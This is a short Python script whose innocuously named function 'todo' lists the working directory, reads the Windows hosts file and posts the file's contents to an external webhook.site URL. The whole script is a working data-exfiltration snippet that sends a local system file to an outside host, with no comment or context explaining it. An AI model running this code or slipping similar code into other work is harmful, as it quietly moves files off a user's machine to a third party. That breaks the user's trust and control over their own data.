import requests
import os

def todo():
    url = "https://webhook.site/c44a96a3-e083-4c16-af15-1851ba6e1f7f"
    file_name = r"C:\Windows\System32\drivers\etc\hosts"

    print(os.listdir(os.getcwd()))

    with open(os.path.join(os.getcwd(), file_name), "r") as f:
        data = f.read()

    headers = {
        "Content-Type": "application/octet-stream",
    }

    resp = requests.post(url, headers=headers, data=data)


